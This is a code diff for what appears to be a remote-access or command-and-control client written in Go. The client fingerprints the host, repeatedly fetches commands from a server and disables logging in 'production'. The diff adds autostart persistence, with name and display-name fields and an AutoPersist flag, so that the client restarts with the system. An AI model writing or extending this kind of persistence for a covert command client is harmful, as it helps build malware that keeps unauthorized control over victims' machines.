@@ -11,22 +11,28 @@ import (
 	"net/http"
 	"strconv"
 	"time"
+
+	"github.com/emersion/go-autostart"
 )
 
 //go:generate go-bindata -o cert.go ../cert/server.crt
 
 type Client struct {
-	Cfg     *ClientConfig
-	HTTP    *http.Client
-	BaseURL string // Gets defined in RequestCommand() - requests.go
-	Token   string
+	Cfg         *ClientConfig
+	HTTP        *http.Client
+	Persistence *autostart.App
+	BaseURL     string // Gets defined in RequestCommand() - requests.go
+	Token       string
 }
 
 type ClientConfig struct {
-	Host    string
-	Port    int
-	HasTLS  bool // for debug only
-	HasLogs bool // disable this in "production"
+	Name        string // Used for persistence
+	DisplayName string // Used for persistence
+	Host        string
+	Port        int
+	HasTLS      bool // for debug only
+	HasLogs     bool // disable this in "production"
+	AutoPersist bool // persistence on program execution
 }
 
 // routes
@@ -86,6 +92,13 @@ func RunClient(cfg *ClientConfig) {
 	RunFingerprinter()
 
 	client := cfg.ClientSetup()
+
+	if cfg.AutoPersist {
+		err := client.SetupPersistence()
+		if err == nil {
+			go client.Persist()
+		}
+	}
 
 	for {
 		cmd := client.RequestCommand()
